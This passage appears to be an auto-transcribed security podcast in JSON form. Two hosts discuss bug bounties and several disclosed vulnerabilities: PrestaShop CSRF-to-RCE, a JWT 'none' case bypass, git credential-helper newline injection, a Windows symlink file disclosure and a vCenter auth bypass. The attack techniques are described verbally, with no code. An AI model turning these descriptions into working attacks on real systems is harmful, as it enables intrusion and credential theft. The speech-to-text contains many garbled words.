3807.6}, {\"speaker\": 1, \"line\": \" Yeah right on by 10 some so\", \"start\": 3823.7}, {\"speaker\": 3, \"line\": \" owner partially owned.\", \"start\": 3825.5}, {\"speaker\": 1, \"line\": \" I think it might be fully owned I think. It hasn't bought them out, but I'm not you know, I don't want to say that on a percent.\", \"start\": 3828.1}, {\"speaker\": 3, \"line\": \" But either way this is just that bug Bounty is here for $100,000 for code execution on the colonel.\", \"start\": 3833.6}, {\"speaker\": 1, \"line\": \" Yeah. Now I will say it's quite a nice payout but one thing you should consider is anti cheat you you don't have a lot of attack surface. It's not like there's just not much you can really hit from an attacker standpoint. So while that hundred K number is big it is Is big for a reason and that 100 K is also for a 0 click when you start talking about a one-click you're looking at 50 to 75k and when you're talking about a you know, more than one click just an\", \"start\": 3842.9}, {\"speaker\": 3, \"line\": \" Allison mentioned 0:25 care specifically actually is I only see code execution on the Kernel level. I don't see it saying 0 click or anything.\", \"start\": 3872.5}, {\"speaker\": 1, \"line\": \" It says network attack with no user\", \"start\": 3880.8}, {\"speaker\": 3, \"line\": \" interaction. Oh fair fair. He said I was looking at the subcategory.\", \"start\": 3882.6}, {\"speaker\": 1, \"line\": \" Yeah, so, you know they have those levels so You know 25,000 less for the for an info leak.\", \"start\": 3887.7}, {\"speaker\": 3, \"line\": \" Yeah, the biggest attack surface is probably going to be that local privilege\", \"start\": 3894.4}, {\"speaker\": 1, \"line\": \" escalation. Yeah,\", \"start\": 3898.2}, {\"speaker\": 3, \"line\": \" exactly. And I'd say that's one of the biggest risks, you know, really with any driver drivers are notorious for having issues. So using them for LP and to be fair 35,000 is still a pretty good pay over\", \"start\": 3899.9}, {\"speaker\": 1, \"line\": \" SEC. Yeah, but I just wanted to point that out for anybody who you know might be hearing this and go. Okay. I'm going to look at Vanguard you. That attack surface is definitely limited. So just you know, keep that in mind before you jump into it, I guess.\", \"start\": 3912.4}, {\"speaker\": 3, \"line\": \" Yeah, that's a good point. I actually when I was looking there I just looked right at the subcategory didn't even notice the one click there on the\", \"start\": 3926.6}, {\"speaker\": 1, \"line\": \" side. Yeah, so we have a bit of a last-minute addition as well but a little while ago can we were exactly which episode we talked about Google vrp their vulnerability research program and so they've actually they've got a grant Outfit due to the covid-19 stuff going around so it seems anybody who submitted at least two remunerated reports from 2018 through to April 2020 will be eligible for for a 1337 dollar research Grant. So, you know, if you submitted two reports or I'm guessing towards till the end of the month you can still submit reports. So because it does say April doesn't say April 20th or anything like that. So, you know anything from that I start. The\", \"start\": 3933.5}, {\"speaker\": 3, \"line\": \" month though\", \"start\": 3980.7}, {\"speaker\": 1, \"line\": \" too. It could be. Yeah, it's not the usage of Iran through April though\", \"start\": 3981.4}, {\"speaker\": 3, \"line\": \" does seem to indicate later in April, but regardless Go ahead.\", \"start\": 3985.5}, {\"speaker\": 1, \"line\": \" But yeah, basically, you know, it's there anybody who has submitted them or wants to submit them if they still take them can get that research Grant. It's not a ton. It's $1,300 but it's something you know, and I think that's pretty cool that they're doing that. I think that's a good move.\", \"start\": 3991.4}, {\"speaker\": 3, \"line\": \" I mean that is I think more than the u.s. Stimulus check is it not I don't think that's I think that's $1,200 and it's a one time thing so offering more than\", \"start\": 4005.8}, {\"speaker\": 1, \"line\": \" that, I know are like us Canadians like candy or\", \"start\": 4015.7}, {\"speaker\": 3, \"line\": \" is this tooth? I was in a\", \"start\": 4019.2}, {\"speaker\": 1, \"line\": \" month. Yeah, it's a lot better than the US has but obviously we also have far less people.\", \"start\": 4020.3}, {\"speaker\": 3, \"line\": \" But well, it's also Canadian peso. So\", \"start\": 4024.6}, {\"speaker\": 1, \"line\": \" keep that in mind. It's probably only like two thousand dollars u.s. For the whole year. But you know that that is there for anybody who you know wants it.\", \"start\": 4027.5}, {\"speaker\": 3, \"line\": \" It's nice to see to what doing that like I am definitely not going to complain about them trying to support the bounty hunters at the same time the seems like one of those areas that wouldn't really be hit by Covid if anything they would have more people submitting bugs now because of it.\", \"start\": 4036.7}, {\"speaker\": 1, \"line\": \" Yeah. Well, maybe because you do have to consider like, you know, you have more time the same sucks. Yeah more time but there's also more family stuff going on to yeah, like so, you know,\", \"start\": 4052.4}, {\"speaker\": 3, \"line\": \" yeah like I could see why it does it does feel like bug hunting is a little bit more resilient than other areas though. Like I'm again, I'm not complaining about them offering this obviously, they're going to be people that can't accept the money if they did the research While on work time the it'll be up to their company as whether or not they can accept that. So Google does also like you donate it. I believe they mention that in here.\", \"start\": 4063.8}, {\"speaker\": 1, \"line\": \" Yeah, they'll match the charitable donations. Yeah. Yeah,\", \"start\": 4088.4}, {\"speaker\": 3, \"line\": \" we'll offer offer the option donate the gram to an established covid-19 relay charity and within our discretion well monetarily\", \"start\": 4091.6}, {\"speaker\": 1, \"line\": \" match so they could even double like they'll match it and and pay on top of that. I'm guessing that's kind of cool.\", \"start\": 4100.9}, {\"speaker\": 3, \"line\": \" That's what it sounds like.\", \"start\": 4107.7}, {\"speaker\": 1, \"line\": \" But yeah, I just wanted to show that out. It was a last-minute thing. This is literally just went out today.\", \"start\": 4110.7}, {\"speaker\": 3, \"line\": \" So yeah, well, so I actually I mentioned this in our Discord earlier actually sometime last week because Google had the post was in public it but I did get the title of the post. They had I think they just accidentally published it and then retracted it but my feed reader got it. I didn't get the content, but I was able to see the title there and I had it mentioned that looks like they're about to off or\", \"start\": 4115.1}, {\"speaker\": 1, \"line\": \" something. Yeah, so basically join our Discord if you want that those inside juicy details,\", \"start\": 4141.9}, {\"speaker\": 3, \"line\": \" oh yes because I brought him we're going to get more\", \"start\": 4148.7}, {\"speaker\": 1, \"line\": \" it's gonna happen every week. Yeah sure but yeah, yeah just Shameless plug, yeah, but with that we'll move into some exploits so our first one is on hacker one and it is a cache poisoning cache poisoning exploit that hits the wp Jason plug-in that can effectively daus any endpoints on a WordPress site that's using it So\", \"start\": 4150.9}, {\"speaker\": 3, \"line\": \" yeah key think being using it leads to a Doss. I was trying to think of how this might be more exploitable it. Like if you could use it for like some sort of information disclosure like\", \"start\": 4173.7}, {\"speaker\": 1, \"line\": \" maybe being able to read some\", \"start\": 4189.0}, {\"speaker\": 3, \"line\": \" unpublished things. You can't like so I was saying because of so, one of the issues here is they use the access control allow origin header. They just repeat whatever origin the request came from. It sends back the X control allow origin with that origin. So I would say I was saying you might be text like that aspect a little bit. Basically, this is just a pi dump like the public data. It's not it's nothing too\", \"start\": 4190.2}, {\"speaker\": 1, \"line\": \" special. Yeah, but basically what you can do there is you can force the server to Cache the those arbitrary origin headers which then get echoed to other requests and you can basically use this to force cross-origin request to be denied.\", \"start\": 4218.1}, {\"speaker\": 3, \"line\": \" Yeah, so I'll mention we've talked about that with like cash and Confused a while back like some of those different cache attacks where depending on what keys things are being cashed on. So the origin hitter in particular isn't getting cashed our story isn't isn't one of the keys yeah isn't want the keys for the cash so having a separate origin still ends up work are still ends up cashing that request so if you get your request from malicious domain when the actual domain tries to hit it it gets the cash response it has this other origin\", \"start\": 4233.6}, {\"speaker\": 1, \"line\": \" yeah so I mean from a high level view it's a fairly straightforward issue the fix was also fairly straightforward and it's like you said you just you fix the way the cash is based on the origin and it's now keyed based on the origin that way poison requests aren't echoed to other Origins but you know like like you said cache cache poisoning attacks are kind of like those cool ones that you don't see overly often we're definitely seeing more from recent we're seeing more than recently kind of like the desync attacks the HTTP yeah he's a good tax so you know it's fun to cover those but this one you know fairly straightforward earned a five hundred $50 Bounty\", \"start\": 4267.3}, {\"speaker\": 3, \"line\": \" Hunter Bounty to sure what it\", \"start\": 4304.6}, {\"speaker\": 1, \"line\": \" is Yeah, it was part of the year ago, but it just saw disclosed last week. So we'll move on to press the shop. So there was a critical see surf to rce bug in prestashop and prestashop. I've never really heard of it before but apparently it's an e-commerce service that allows people to host their own shops and stuff like that. And obviously when you're hosting a shop you're going to need to support images and whatnot. So they provide a file manager that allows various media file types to be uploaded and one of the file types. They allowed to be uploaded is SVG files, which allow JavaScript so using that you can basically get an xss. Now. Obviously this can only really be performed by someone who can upload those SVG files and most likely someone's not going to want to access their own store. But it also seems for whatever reason the file upload request didn't have a csrf token on it. So these are\", \"start\": 4306.1}, {\"speaker\": 3, \"line\": \" just words wherever the action that whatever reason there. It's not uncommon because Sometimes the code that handles just kind of post in general won't be the code that handles multi-part uploads and that's kind of what's important here is that when you do this sort of post request with a file, it's usually it's being done with like URL. I forget what the Mind type is now, but it's just using like that URL encoded like chi chi equals value kind of setup. Whereas with multi-part it's definitely more complicated setup. He giveth the The boundary and then that's kind of used to separate so you can send more binary data. You can send larger packs about that. So when you do a file upload, it's switching protocols a bit. Well not protocols by switching how the content gets parsed and so in a lot of systems it'll be different code that handles that or just the normal postcode won't in the paddling. That's a won't end up checking to see sir. It doesn't seem like that's the case here, but it's not an uncommon thing or upload to be missing or not actually validating. zi serf\", \"start\": 4360.1}, {\"speaker\": 1, \"line\": \" tokens Yeah, so then using that xss, you can basically make a malicious link that they can click on and they escalated it further to get rce because they made it so the excess can fetch the the valid Caesar of token to upload malicious themes through the admin panel and through these themes, you know, it's a zip file. Basically, they contains all the files for it and they allow PHP files in the zip file and they don't check or like me. Negate this at all. They just allow straight-up PHP files to be included in the theme so you literally you just upload a backdoor PHP file that can execute commands and you have command execution on on the server. So it's pretty funny. I'm surprised that they you know, they have see serve tokens for most requests, but they don't like bother the one that matters.\", \"start\": 4432.7}, {\"speaker\": 3, \"line\": \" Yeah. Well, sorry for the file up upload their that that's when they don't check them are when it comes to the themes like I don't know how prestashop does their things but having PHP files in themes for our PHP system. Is it that unexpected? I don't know prestashop maybe doesn't if there's themes are purely like CSS or something else. But I do know like\", \"start\": 4485.1}, {\"speaker\": 1, \"line\": \" WordPress and file and themes like first up for that kind of service. I think CSS only would be a\", \"start\": 4508.8}, {\"speaker\": 3, \"line\": \" pretty good thing is you want to be able to kind of customize your page has a lot and themes can kind of be a replacement for plugins. I don't know I'd say it's something to really consider before you allow that. But I mean it is behind. The admin panel it is this is one of those cases. I would just kind of being softer once you're on the inside. You know, it's easier to act like once your admin you're in a trusted position obviously ideal cases just don't have that but it's definitely not uncommon to allow it.\", \"start\": 4517.6}, {\"speaker\": 1, \"line\": \" This post is pretty cool. It's one of those multi stage attacks. I did find some things a bit weird about it though for one the post mentions that the bug is unpatched as of April 18th, which is when this post was published and there's no disclosure timeline or information or anything like that. So the I just dropped a zero down on the surface because I don't play anything about like responsible disclosure anything and the reason this kind of warning is something like on something like a service and you can get like userland code execution on the server that's quite impactful compared to you know, even if you drop a zero day for something that someone has to like it's a local thing. They're running. It's a lot harder to hit that person where it's a centralized server like this. It's like so much easier to abuse by swirling Eddie's\", \"start\": 4557.1}, {\"speaker\": 3, \"line\": \" and I Don't know if this is necessarily centralized server you can this is open source, so you can run this wherever.\", \"start\": 4603.0}, {\"speaker\": 1, \"line\": \" But anybody can I don't lot easier to hit than just someone's desktop. For example, you know what? I mean? Like it's a lot more accessible.\", \"start\": 4612.5}, {\"speaker\": 3, \"line\": \" Yeah. Yeah. No, I just mean like it's also not going to be centralized in terms of patching. Like people have to patch their own deployments of it. I think it's kind of like WordPress where you can run it on your own or you could use the\", \"start\": 4618.9}, {\"speaker\": 1, \"line\": \" centralized one. Yeah that\", \"start\": 4632.5}, {\"speaker\": 3, \"line\": \" said I will also make a mention here that I did find it surprising that the post request actually did get sent I say just surprising because I was sure that that should be blocked by same origin policy when you try and set the content type header. I didn't think you could do that cross-domain. My understanding was that that would be blocked by same origin policy because it's acting on different domain and You can create like a form that would submit to another website. I didn't think you could do the xhr and modify that that's that I did give it a quick test and it did fire off you can read the response but it did fire off. So yeah, I was just a little bit taken aback with it. I'm not sure if that's a kind of recent change, but I'm sure that hasn't always been the case. I do maybe want to dig into that a little bit more because that opens up a ton. Of potential see serfs if you're able to do that. like I said I ran it it did work and you couldn't do the response but it did fire the request without doing any sort of pre-flight so maybe content types now okay to edit maybe it has been that's that it just it did take me back a little bit when I saw that because it seemed it seemed like that wasn't always\", \"start\": 4636.0}, {\"speaker\": 1, \"line\": \" possible the oak is of thing oh sorry going\", \"start\": 4723.6}, {\"speaker\": 3, \"line\": \" well just going to say because what I remember doing is trying to exploit Jason ones where you'd have to kind of mess with to create what look like a Jason body because you can't actually send the content type Jason you'd kind of you'd mess with the key value to be the start of your Json and then just kind of end it off with the equals being or yeah the equals then possibly like and characters and stuff would be just kind of Ended on within the Jason kind of like you just try and capture those extra things that get added to the normal sort of submission. So if you could just send like content like Jason or well application slash Jason and that just opens up a lot easier route still excellent and some of those issues. So I do kind of want to dig into that a little bit more. So I'm just adding that as a bit of a caveat here. It seems like, you know, this definitely worked. I gave it a try but for some Reason, I don't feel right about that. I feel like I'm missing\", \"start\": 4728.2}, {\"speaker\": 1, \"line\": \" something. The only thing I was going to add on was jumping back to the disclosure stuff looking at the advisory. If you look at it, it was posted the day before this right up one up. So prestashop was given if the if it was sent to them they were given one day before this write-up went up. So, you know overall it's an interesting posts and it's a cool multistage attack, but I do question the kind of Ethics, I guess of the post it seems that's fair drop the zero. So, you know,\", \"start\": 4788.3}, {\"speaker\": 3, \"line\": \" I guess something that's maybe worth looking at. Is what the current version is? Maybe this just\", \"start\": 4824.1}, {\"speaker\": 1, \"line\": \" isn't I don't know I tried looking and I couldn't find anything before like the last couple days. So. Do they have the versioning information on there?\", \"start\": 4832.1}, {\"speaker\": 3, \"line\": \" I'm just having a technical difficulty here doing some lies. It looks like 1.77. And what was the release Here for 1.76?\", \"start\": 4847.5}, {\"speaker\": 1, \"line\": \" for the actual issue\", \"start\": 4862.4}, {\"speaker\": 3, \"line\": \" yeah yeah it's 1.76 and the current versions 1.77\", \"start\": 4863.8}, {\"speaker\": 1, \"line\": \" okay so it's possible that it's been passion is just like talking about an end a or something and just didn't bother to mention it\", \"start\": 4868.9}, {\"speaker\": 3, \"line\": \" yeah or that updates happened since could be is another possibility here\", \"start\": 4875.4}, {\"speaker\": 1, \"line\": \" Rapidfire update yeah but anyway we can we can move on so our next one is also on hacker one and it's a one-time PIN bypass so or rather it's a disclosure of a one-time pin so it's in MTN play which seems to be a lifestyle type site with a variety of different things I've never heard of it before\", \"start\": 4881.4}, {\"speaker\": 3, \"line\": \" yeah well the code of Za makes me think South Africa so I don't think you travel down there too often\", \"start\": 4902.4}, {\"speaker\": 1, \"line\": \" never yes but it seems the problem is the request which sends the one time pin so receives the valid one time pin in the response and the network response\", \"start\": 4909.0}, {\"speaker\": 3, \"line\": \" well so how else would you expect the UI to validate\", \"start\": 4919.8}, {\"speaker\": 1, \"line\": \" it so you can just send a bogus request to get the valid one type in so it's a very straightforward issue but it highlights just how like just because you have a one-time pin doesn't mean you're automatically safe you have to make sure that you implemented properly and that's not even\", \"start\": 4922.3}, {\"speaker\": 3, \"line\": \" get this is a stupid bug honestly like I mean it's a good thing to have made unfortunately the images aren't working for me so I can't have to show what the request look like but it was literally an Okie field yeah no it was working for me too but yeah it's literally the response when you send the request into replying saying hey you need a fill out this OTP It's literally just you know, this Json blob on a Blog. It's Jason text, but Jason contains OTP as a field and the value right there in the response. It's so you can see why that's a battery. You should be able to see why\", \"start\": 4941.6}, {\"speaker\": 1, \"line\": \" that's bad. Yeah, I mean, you know, it just goes to show that you have to implement it. Right and that's not even counting. The other issues that come with one time pins. You know, if you're talking I think that's\", \"start\": 4978.5}, {\"speaker\": 3, \"line\": \" feels like they weren't even trying though. Like this is an issue that shouldn't. so this is probably one of those things where it got added to an object and then they just replied with the object not from realizing what all was in it yeah like somebody just kind of passed it in there like a cupping added a little bit later just like oh we need this value you know it needs it here when it sends this object somewhere else to and then just then remove it and didn't realize that God dumped but still I mean it's it's an inexcusable issue\", \"start\": 4990.2}, {\"speaker\": 1, \"line\": \" and I will mention as well it does seem like this happens through like you know SMS and even if they implemented this correctly and you know they didn't leave the one-time pin SMS OTP is not really that great because you have issues such as some swapping you know taking a Sim and getting the victims number put it on your sim and you can recover the OTP so even if it were implemented correctly it still wouldn't be great but you know if you're going to add it you should at least try to implement Correctly, so, you know just wanted to will just add that as a you know, the dumb bug of the week, I guess because that is probably like the most glaring obvious plug that is in the episode I would\", \"start\": 5023.7}, {\"speaker\": 3, \"line\": \" so yeah, I would agree.\", \"start\": 5064.9}, {\"speaker\": 1, \"line\": \" Yeah. So the biggest issue I'm going to get into is the get or actually. Oh, no you had at this\", \"start\": 5066.9}, {\"speaker\": 3, \"line\": \" Jason the Json web token validation bypass. So if you're not familiar with JWT that Jason web token the basic idea is that it's a token you can issue to a user and they could just kind of Supply that with their requests and you can validate the token without actually to query the database like the token itself will be signed by your Authority. So, you know, like you were the one that signed it you validate that's a valid token and it'll include things like grants information for like what they're actually allowed to do or you can include a variety of things but the basic idea Is that it's just as a really lightweight way to do with Education Without need to query dead based on every page request. There are some downsides with that. I'm not a big fan of there are a lot of ways. You can shoot yourself in the foot using tokens. So while it definitely has some uses you've got to be careful. It's a lot like crypto in general. You've got to be careful with it because you never want to issue a token. That doesn't expire for example Back in 2015 a big issue was you could also just kind of create create a token and insert the algorithm saying well, what's the signing algorithm? Oh, I didn't sign it at algorithm none and give it all the grants you want and if something just check if it was a ballad token and that it had the right grant and didn't actually validate that it was signed by who they expected to be signed who they expected to be signed by. using the non algorithm is you can basically create your own tokens so in this case off the zero they obviously as most places have they've disallowed using the none algorithm I don't get why not algorithm was even included in the first place maybe development purposes stupid thing to use like you're never going to want to use that in practice like I can't I cannot think of any legitimate reason to use none anyway they banned not and by checking off the algorithms not but they checked it in a case sensitive way so you can set it to done with the capital e and allow you to use the none algorithm again. This might actually even be a competitor for the stupid bug of the week.\", \"start\": 5074.2}, {\"speaker\": 1, \"line\": \" Actually. There we go back to the heck. Yeah, I forgot you added this one somehow so I was going to jump into\", \"start\": 5221.5}, {\"speaker\": 3, \"line\": \" the I actually forgot I activate to\", \"start\": 5228.6}, {\"speaker\": 1, \"line\": \" they're not in my nose feels bad now, but yeah now I will jump into the the get issue. So this one's kind of a fun one, especially because it isn't get which Muse, you know people use it every day specifically the issue is in the get credential helpers. So, you know, this basically allows you to store credentials so you don't have to enter them every single time. So if you clone a repo and it's a private repo and you enter the password for it, and then you want to push updates to it, you know, you'll probably want to store those credentials so that every time you push you don't have to, you know, enter your crib your creds or whatever so, you know, they give an example if you execute command like get clone example.com Get will call the registered helpers to see if you contain any credits for that domain and then it'll attach those credentials to the outgoing or requests when it's asked for authentication. The problem is in their protocol. The implementation is actually vulnerable to a new line injection. So you can do something like example.com back / or / backslash n host equals github.com. And then the credential helper will think it needs to fetch creds for github.com, but it'll send them to\", \"start\": 5231.1}, {\"speaker\": 3, \"line\": \" example.com. Yeah, so I will just Correct is slightly there? It's a question mark and then the new line you're injecting the new line after the domain and as part of the query or as probably query string just you want to point that out. Otherwise, it's exactly as you said you're just able to inject in the whole protocol there that uses to communicate with the credential helper is just that new line key equals value type setup. So host equal something if you send in a second host a specter said you could get it's sending the wrong creds to the Ang host\", \"start\": 5299.0}, {\"speaker\": 1, \"line\": \" Yeah, now part of the reason I said this was a fun issue and not a serious one is in practice, you know, the attacker would have to send you that link and you would have to use it that link would like a link would let like that would look extremely suspect and I think I'd question anybody who fell for that considering gets user base. Most people who are using get should be wise to not use suspicious-looking links like that.\", \"start\": 5333.2}, {\"speaker\": 3, \"line\": \" Let's just clone this repo. Whoa, what's why does this have a random domain in there and go what's going on here\", \"start\": 5360.7}, {\"speaker\": 1, \"line\": \" now? Don't worry about me fine. Everything's on fire. This is fine. But\", \"start\": 5367.7}, {\"speaker\": 3, \"line\": \" that said I think you're about to go into it.\", \"start\": 5371.8}, {\"speaker\": 1, \"line\": \" Actually. Well, I was just going to say like, you know, it's still an issue. It's kind of a fun one, but I don't think we'll see it\", \"start\": 5374.3}, {\"speaker\": 3, \"line\": \" exploded. Okay, so actually I guess you're not going to go into it. So they do actually showcase where you have a much more harmless-looking URL, which is git clone and just have like example.com / my are example.com whatever the repo name is duck yet and you can abuse that by using a 301 redirect though you have to basically you can if you redirect that docket requests whatever comes in there to one of these exploitable URLs you can do that but you do have to include a username with it which means it's very lip it has to be targeted in terms of who you're targeting with it But they do include the case that you can use a 301 redirect to basically get the normal-looking Clone request to expose\", \"start\": 5380.7}, {\"speaker\": 1, \"line\": \" something. Yeah, I'd actually somehow skipped over that part. So that's that's that's interesting. It does make it a may be potentially a bit more viable for targeted attacks. But like you said you need the username. So\", \"start\": 5434.4}, {\"speaker\": 3, \"line\": \" yeah. Yeah, and the reason why you need the username is basically you would do the injection as part of the credentials part of the URL. So, you know when you do like the HTTP slash slash user name colon password, which most people would never use that type of oh sorry that type of URL I'm practiced but uh it is use that time so username act whatever the website that's why you need to include the username there you injected into the username which then limits who you can attacks need to know their username but yeah that's a practical attack I think it's limited it's targeted but definitely\", \"start\": 5446.4}, {\"speaker\": 1, \"line\": \" doable yeah so NCC group is a you know their articles we've covered quite a few times in the past and this one talks about a local privilege escalation found in the component object model or calm sir this isn't windows so they actually found multiple vulnerabilities but they found one in particular that they wanted to cover because for one it was similar to some of the other issues they found and this one in particular I think Microsoft tried to patch and they failed and then they ended up exploiting it again and Microsoft had to patch it again and the other thing that makes it interesting too is the bug was actually created due to documentation being written incorrectly so that's that's a pretty serious issue because that means that there's initially more areas that have a very similar bug do to reading the documentation and expecting it to function like the doc said even though it doesn't so you know they say like you know even though this issue is fixed there could potentially be more issues like it out there just because it's pain from you know and then correct documentation basically so they looked at various Services running is NT Authority or system and they looked at servers that were executing executing In the windows module installer service context as I think all the server's running in that context are running is NT system. And the one they ended up looking at was the component-based servicing session. So part of what made this cool is they show a way that they first exploited it and then they show are they exploited again after Microsoft failed to patching it. So the bug was a arbitrary file disclosure in the icds session 10 interface. They found a bunch of you know, various methods that are attached to that. Interface but to kind of stood out and that was the initialized and create package methods. So the initialize function needs to be called before any other methods can be called, you know, you can kind of speculate that that's going to be the case just based on it being called initialize and you can pass it a boot drive and a Windows directory as well as some other stuff. There are some restrictions the windows directory has to have the directory structure of a typical Windows installation. So it needs a user's folder and needs to contain certain components. I'm guessing I thought they mean like dlls and other folders stuff like that but an attacker with access can can fake that structure and the other thing they can do is they can also create symbolic links which is then copied and is readable by the attacker which can lead to arbitrary file disclosure now Microsoft Patch this last year in November and what they basically try to do is you know look and say okay this is a symbolic link okay we'll just reject this we're not respecting the symbolic link so when they looked at it again after the Patch they noticed an error was being logged but the service was still copying the target file and this was because the boy they checked if the file was a symbolic link they use the get file attributes W method and the win API to check if the attribute is set for the symbolic link and this would work fine if the function worked out the documentation set it worked and the documentation said if the path points to a symbolic link make the function returns attributes for the symbolic link knocked the target file and that turns out to be wrong the it Returns the attributes of the final Target file not the actual symbolic link so because of that there check was essentially useless and it would still end up copying that Target file so this was again finally patched last month so it's just one of those cool things where you can see like just because an issue is patched doesn't mean it was patched correctly so that's one thing and then the other thing is you know you have to kind of question the documentation sometimes yeah liked a\", \"start\": 5483.9}, {\"speaker\": 3, \"line\": \" question question the documentation I just thought it was interesting that the two tools that create symlink to on the make link tool had different behaviors there too because that was kind of what the difference there was when a symbolic links crave with the make link tool get file attributes does return the appropriate attributes and includes that file actually reparse point that they're looking for but when you use the create symlink tool the documentation was wrong the documentation indicate that what do that and it doesn't I just I just found that interesting that the two different tools ended up resulting in some different and I'm sure like, it creates a slightly different type of Link because Windows has a bunch of different link types.\", \"start\": 5716.6}, {\"speaker\": 1, \"line\": \" I was going to say I'm not really a Windows person but I think part of the issue is that there's different types of those thinking Microsoft terminology. They're technically called junctures or whatever, but you know, there's like multiple different types like you were saying and it's possible just they miss that\", \"start\": 5762.0}, {\"speaker\": 3, \"line\": \" Junctions and links I think our Really different in Windows in terms of at least how they work that said that's getting too deep. I think doesn't matter. That's all I was saying that was kind of the same thing. I think what's going on our part of what happened here is that they were implementing different types of symlinks.\", \"start\": 5777.1}, {\"speaker\": 1, \"line\": \" Yeah, so kind of a follow up to something we covered last week is what's a 10 pwning be Center was CDE 20 2013 9 52 and those who tuned in may remember we saw a security advisory for a sensitive information disclosure in VMware vcenter, but it was weird because it had a super-high cdss score of 10, which is very high for an information disclosure and we weren't exactly sure why there wasn't any technical details out at the time zi speculated that it could have been. credentials being leaked or something like that and what it basically seems to be from this post is that information disclosure was undercutting the issue and we\", \"start\": 5798.6}, {\"speaker\": 3, \"line\": \" have greatness and this is not an information disclosure this is an authentication bypass yep I mean there's no way I would call this information\", \"start\": 5837.1}, {\"speaker\": 1, \"line\": \" disclosure they were downplaying it\", \"start\": 5846.6}, {\"speaker\": 3, \"line\": \" yeah and I think we speculate that they were probably trying to downplay Something About It by calling it that but yeah like I don't see how you even think that this is info disclosure and it doesn't do info disclosure well yeah but it's like the expose themselves doesn't disclose anything no so the exploit itself I don't know if you want to talk about it\", \"start\": 5848.7}, {\"speaker\": 1, \"line\": \" you can get into it if you want to\", \"start\": 5872.7}, {\"speaker\": 3, \"line\": \" all right um basically it just comes down to this VM der Legacy access check its kind of two bugs to the like see access check when one of the permission checks fails See if I can find the co are the relevant code\", \"start\": 5874.7}, {\"speaker\": 1, \"line\": \" by the way, you can just guess by the name when you have Legacy in the name. That's like a big red flag. Yeah, so there's something there.\", \"start\": 5893.0}, {\"speaker\": 3, \"line\": \" Yeah. So the common pattern with with The Heirs is it started off in this in the function. It'll set the d word are RDW are but I'm probably going to keep saying the word it'll set that to 0 and then if something fails the expectation is that it's going to go ahead and set the Are it's going to say you know, whatever the air was what ends up happening is during one of these calls the VM der allow operation based on group membership. Basically if it fails it just doesn't Seth or if it's successful. It will set the DW are to 0 it will say there was no air, but if it doesn't fit or sorry if it fails it just won't adjust that\", \"start\": 5900.6}, {\"speaker\": 1, \"line\": \" are it'll just\", \"start\": 5945.3}, {\"speaker\": 3, \"line\": \" return what yeah, it just returns. with which means a uses that default value which is basically a fail open condition so that's part of one of the issue of course you don't end up having any actual token you don't have anything associated with your ldap session or anything like that and then the other part of the issue is part of this Legacy thing is certain systems would attend cave without actually having any ldap session no token being associated with them and that would be these internal services so they would just be granted root privileges So that's kind of the high level look at it. I'm actually getting to that point was a little bit more complicated. Just trying to attend here with bad credentials of course of what end wouldn't work that probably would have been discovered pretty quickly. But there was kind of an issue where it would say one of the internal Flags a lot earlier than it should even if the authentication request wasn't successful. It would have still set this flag saying that he weren't Anonymous earlier on on which ultimately you would basically do that add yourself to add yourself to the admin User Group once you're kind of addenda cated at that level and then you can access\", \"start\": 5946.5}, {\"speaker\": 1, \"line\": \" vsphere yeah\", \"start\": 6021.9}, {\"speaker\": 3, \"line\": \" so so I was just going to say so this is like the opposite of information disclosure nothing's being disclosed yeah until you add yourself as an admin or whatever\", \"start\": 6025.1}, {\"speaker\": 1, \"line\": \" yeah but like you were saying it's an off bypass one thing that was kind of interesting though was that first issue you're talking about one thing I'll say about that by the way just as a quick like interject as a it reminds me a lot of the Nintendo switch bug I don't know if you remember like the switch presentation that was done at CCC a little while back but they had a bug where they set the initial pit I think for your access like they did an access check for you know The process was allowed to access certain kernel driver stuff or something like that and they checked if the pit was 0 for Colonel because that has root privileges. So they ended up specifying a default of pit equals zero, but then on a fail condition, they never actually set PIN to the correct one. So it's kind of like an uninitialized use it's initialized to zero, but they don't initialize it to the actual pit. Yeah, that's kind of what's Happening Here. They don't initialize the error from zero.\", \"start\": 6036.1}, {\"speaker\": 3, \"line\": \" That's where it's safe. Like it it's fails open a fail open condition is kind of like that where when it fails it fails in an open condition. Yeah, that's kind of at least how I\", \"start\": 6091.5}, {\"speaker\": 1, \"line\": \" describe it. Yeah, the other thing that was interesting about that issue was that issue was actually fixed three years ago in\", \"start\": 6102.1}, {\"speaker\": 3, \"line\": \" the right place. Yeah,\", \"start\": 6110.3}, {\"speaker\": 1, \"line\": \" but it never I guess it never landed. I don't know because they said it was fixed in August of 2017, but it didn't make it to release. So that's that kind of makes me question what's going on in the pipeline there? Because that like, you know the fact that they fixed it they had to have known how much of a serious issue that was so seeing that not make it to not necessarily limbo. For three years seems really\", \"start\": 6112.4}, {\"speaker\": 3, \"line\": \" odd. They could have known it was an issue but didn't really have a way to prove it was exploitable because they did kind of have to take advantage of that not being set to an anonymous bind before you can actually get through on it, which does take a little bit of internals detail. And I mean, it could be something like somebody did that patch right before they quit and then, you know the patch, you know, maybe their boss quit or something and never Really gotta prove never went through the normal process. They then character follow it up on and just kind of got stuck in\", \"start\": 6134.8}, {\"speaker\": 1, \"line\": \" limbo. Yeah, it just seems kind of weird like even like three\", \"start\": 6169.0}, {\"speaker\": 3, \"line\": \" years as well. I agree like it's so weird sign also like it's I guess it's not a coat smell but it's another one of those things. You know, what are they\", \"start\": 6172.8}, {\"speaker\": 1, \"line\": \" doing here? Yeah, so, you know like we mentioned the first bug was fixed this demonstrates how like a myriad of issues can lead to a takeover. It's a you know, it's kind of it's interesting in that regard. But what I was kind of curious about was obviously the first bug was fixed, but I'm guessing the other issues like the bind one you mentioned still\", \"start\": 6181.8}, {\"speaker\": 3, \"line\": \" exist. possibly yeah I didn't see anything about that either well so actually they do mention here that this is actually still still exploitable on the current version you just can't configure it to be an exploitable condition oh they do actually meant because they mentioned that when they're trying to get set off\", \"start\": 6203.8}, {\"speaker\": 1, \"line\": \" so the issue is there it's just not easily edible\", \"start\": 6225.9}, {\"speaker\": 3, \"line\": \" yeah like basically they could directly call and change one of the configuration values but they couldn't like the you I no longer like you set the configuration in the\", \"start\": 6229.0}, {\"speaker\": 1, \"line\": \" insecure way okay but yeah you know we just wanted to follow that up because it is something that like really confuses at the time and we wanted to know more and now we do know more we know a\", \"start\": 6240.1}, {\"speaker\": 3, \"line\": \" little bit more and they know that it was not info\", \"start\": 6251.9}, {\"speaker\": 1, \"line\": \" discovered her yeah we know that it was downplayed heavily by the\", \"start\": 6254.0}, {\"speaker\": 3, \"line\": \" Yeah like that like I can't as if I can't respect a company doing that I mean at least be honest about what your issues are 